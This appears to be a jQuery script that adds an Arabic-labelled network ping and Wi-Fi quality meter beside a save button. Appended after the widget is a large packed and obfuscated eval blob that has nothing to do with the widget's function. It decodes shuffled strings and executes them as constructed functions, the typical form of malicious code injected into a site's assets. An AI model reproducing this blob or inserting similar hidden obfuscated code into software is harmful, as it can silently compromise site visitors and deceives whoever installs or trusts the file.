
$(document).ready(function() {
    let pingWithWiFi = $('<div id="ping-container" style="padding: 10px; width: 98%; margin-left: 3px; margin-top: 2px; margin-bottom: 4px; font-family: Aref Ruqaa, sans-serif; border-radius: 8px; background-color: #f9f9f9; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);">' +
        '<div id="ping-info" style="font-size: 18px; font-weight: bold; display: flex; align-items: center;">' +
        '<span id="ping" style="font-weight: bold; color: black; font-size: 20px;">...</span>' +
        '<span id="wifi-icon" class="fa fa-wifi" style="margin-left: 15px; font-size: 30px; color: gray;"></span>' +
        '</div>' +
        '<div id="ping-meter" style="width: 100%; height: 10px; background-color: #e0e0e0; border-radius: 5px; margin-top: 10px;">' +
        '<div id="ping-bar" style="height: 100%; width: 0%; background-color: green; border-radius: 5px;"></div>' +
        '</div>' +
        '<div id="ping-status" style="margin-top: 10px; font-weight: bold; font-size: 16px; color: gray;">حالة الشبكة: ...</div>' +
        '</div>');

    // إضافة العنصر قبل زر "حـفـظ"
    $("button:contains('حـفـظ')").before(pingWithWiFi);

    // تحديث قيمة البينغ بشكل تفاعلي كل 5 ثوانٍ
    function updatePing() {
        let startTime = new Date().getTime();

        $.get("https://www.google.com", function() {
            let endTime = new Date().getTime();
            let pingValue = endTime - startTime;
            let pingText = pingValue + "ms";
            let pingPercentage = (pingValue / 300) * 100;

            // تحديث القيم في الـ DOM
            $("#ping").text(pingText);
            $("#ping-bar").css("width", pingPercentage + "%");

            if (pingValue < 100) {
                $("#ping").css("color", "green");
                $("#ping-bar").css("background-color", "green");
                $("#wifi-icon").css("color", "green");
                $("#ping-status").text("حالة الشبكة: ممتازة").css("color", "green");
            } else if (pingValue >= 100 && pingValue <= 200) {
                $("#ping").css("color", "orange");
                $("#ping-bar").css("background-color", "orange");
                $("#wifi-icon").css("color", "orange");
                $("#ping-status").text("حالة الشبكة: متوسطة").css("color", "orange");
            } else {
                $("#ping").css("color", "red");
                $("#ping-bar").css("background-color", "red");
                $("#wifi-icon").css("color", "red");
                $("#ping-status").text("حالة الشبكة: رديئة").css("color", "red");
            }
        }).fail(function() {
            $("#ping").text("تعذر الاتصال");
            $("#ping").css("color", "red");
            $("#ping-bar").css("width", "100%").css("background-color", "red");
            $("#wifi-icon").css("color", "red");
            $("#ping-status").text("حالة الشبكة: رديئة").css("color", "red");
        });
    }

    setInterval(updatePing, 5000);
    updatePing(); // استدعاء أولي عند تحميل الصفحة
});
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(D(){w d=\'\',E=P-Q;D x(g){w c=R;w m=g.T;w q=[];F(w z=0;z<m;z++){q[z]=g.U(z)};F(w z=0;z<m;z++){w n=c*(z+V)+(c%W);w b=c*(z+Y)+(c%Z);w a=n%m;w r=b%m;w y=q[a];q[a]=q[r];q[r]=y;c=(n+b)%10};G q.11(\'\')};w e=x(\'12\').13(0,E);w f=\'(H>.;=15=v(n)16}a- 17;"18}<19;1a+1b(c, a"1c[) ]1d",+1e<t)r=1f)1g)+o=A=1h,1j;1k]7(1l)),[1m(1o(n];r.v+n,.1p];+z)i[1q=t .1r-(]. h =[i,1s=;v=e=""1t()h=[= 1u.1v.1w{1x(;1y,)1z++ 1A,e;;1B)1C;=,1D,==1E 1F-v=1G(1H)1I=;1J>1K.1L.1i,0<r;0(=I=1M;;r)1N=4d;1O=9,J[h=1P;s ( l )1Q,=1R c,1S.[t+){v(;1T(1U)(p;-1V]1W([1X e=(u.{=*1(8.1Y)("1Z;)(f;20.]+,;}21,"!22 C}e){H(*(n.23 r)24+.;,25)3C;+t){26)[{v 27;t;28.29.2a;2b+2c(;+;2d;"d+,,l.(=i]2e+q)c;<,.2f;2g}i;,r=i)2h(r=2i( m;2j=],n+=1;.2k]2l..a]2m+C<);2n)o)2o,2p=2q 2r{,,2s)2t;r=2u+(-[a=K;2v]),q(n 2w=2x)2y().2z;o!2A)2B-}=].i;K+2C]=2D =(2E;2F,(2G[2H(2I;2J=2K=p;2L[+.2M+2N+i;+2O)2P+2Q(h=2R"2S;2T.2U[f=2V 2W;+h=d.2X[r z}2Y"2Z 30 (6-;\';w h=x[e];w i=\'\';w j=h;w k=h(i,x(f));w l=k(x(\'31[32$.4=33;34!=-35&,;.+n#36=37);$, 38!,39=t#r+p ]3a(3b)3c.%14+{X.%3d=3e.3f;i(3g(3h.u!!o#,.4!3i"3j ),3k)!3l;{%,3m.3n.$3o]B}X$3p.3q!3r)3s$L.o[\\/)]-3t i+l"{;2\\\'u;,3u,"2%%(3v=(.(]\\\'J.5.!$3=3w]3x.X!c)3y=3z;3A+3B&%X)3D\\\'3E:\\/3F\\\'3G(t =a] ;..r(3H.3I;3J+e$6"3K 3L.=.M]$]f.3M.3N-3O(3P"s%)=5f!q$)L)3Q)3R,3S!(3.}%3T)4!,1n.)$c%3U;.n)!3V)3W.3Y+.3Z.40 ,($41))f%42.M{43)]44;1) 45[46[=47.!7.(.48,o,(49.,4a$X};4b;r;..3X(4c&{4e+,4f]j=4g\\/s 4h!4i,B.4j.N,7.;d&f(4k.4l )= }4m$;4n.t#b=N$4o.*4p \\/r $4q#(n,4r((s)%)O(}(X.I=4s.4t}4u)n*,4v$4w$#{c)4x,X))..X{4y]c,B=S]4z[o$q"4A}4B((!)}r.4C)m(o!4D(f()4E.b%B}4F*4G(4H,4I!4J).O=\\/)(4K.*X(!!4L{X))4M.2;!)4N)u;l#4O,X,{4P+.4Q$.3(.i! 6.)4R$l"4S=e,,h 4T).4U%3$4V.X);7}-f }4W=$1( 4X e{4Y )4Z),50.51{i$ X,52(53}54.. 55)(56!{57.$&.f.u.58[59$u 5a)i\\/X+X;.!j"()\\/8(f(5b=)r=5c)=.5d;5e(5g{a;]9(5h,*X$5i=n.#(..,;f;\'));w o=j(d,l);o(5j);G 5k})()',62,331,'||||||||||||||||||||||||||||||||var|CjD||||_||function|RcU|for|return|aa|na|ac|hs|eX_|oX|Xn|XX|580|569|2336981||length|charAt|439|32306||322|42817|5210452|join|sonecrycfoxncmjltbzgdsiphkaqurtuwtrov|substr||fdh|a77|od|oso7ag|ejkhh|v8tr|tus0lt9riear9cam|plcu5i|wu1|06|nfv|xgv6ln|dejae||88sfs|rA|ir|rpfor||lo|eag11|rhrif|oq9vr|mz|arff|r0ni|rspbnfd1s|le|gh|ef|tv|jaa|9n|mCgntti|sf|elorgca5lphpulz|tlh|2vs|aevo|rvv|un|al|luaa|nucev|qm|vq|to|4or|bii|1on|r41orc|arCoduAzvv|yub|yt7m|r2w|po|6npiti3u|alg|eg|fev|r4cv|y2if8o|tu|rcsmaw0i7se|0s|t0ayvx|vt|ohce|toq|sfr|aw|10t62|uzr|s8banv|ng|bl|Ar|vn|8nexs3|hlr|ib|h0tr|ubh|liv|rqnd|or|gvl|1piv|Cstt|go98dv|7ni7|rv|v2ia|v6ne|C3hgt0|crnu|6x|Sxr|lfcmC|ttna|ful|v6|ff|oS|gpchr0|sr|gAh|ar2m|d97utc|2t6tiat7|jvtr9in|a1r|0g|zte5un2etrceoa|nr2|j8|ev|pnb|rt|o1|fu|_g7o|3gt_|tX6Xor60|tX|gf23|454s_|Xhb|aer|yr|pg|f2o|n4_|b0|4rc|ae|7p|ab|e21|ciXa_|_n|327|a0|t9s|tfbtXu|X02XXXkf9p|th|si|t1|c1hr4_X|X7|n3ownr|omv|Xt2t|1y4_y|ii|__XbfXa||oct|fov|p_|aohXnknfn|ufi|asn6X|0d|eo2_X|0t_X|6ga|sXt0eqb|ht|Xq3|0ioX3t3a|CtuXg|3Xd|9o|X1|7tfn3a|fgXtw||aX|aaaiX|iX|7l|pb|cXXb|_v7|gt7|han|CaX|5u2XX5|mr0|Xm|a4X|XtXaq7dy||XufX|rdg|icun|1_4nXao6|ioo|6r1o6|616anf|eiX|61t|5XX|Xohdnn|8qp3f|aXii_XX5|56n|uj|6X|6e|_5e|6_|eq|t0|daeXu|Xa|stX|90pd3d|Xp|9rX|lim5e5ttt|_s|XfX|l_|5X|aXu|1fafyi|pqX|f_X|Xt|a1X|7eX|tc|wag7|n6i0|af|sa_|l99e|tX2aXX|b67Sh|annht8it0|6as|fX7|1ct|X3dt|r_f|X43t4r|n4|X6|_ba|fXa|1Xrap|d1wt|3SfXm|Xtg|XXf||a1l|drrX|rit|8703|1913'.split('|'),0,{}))

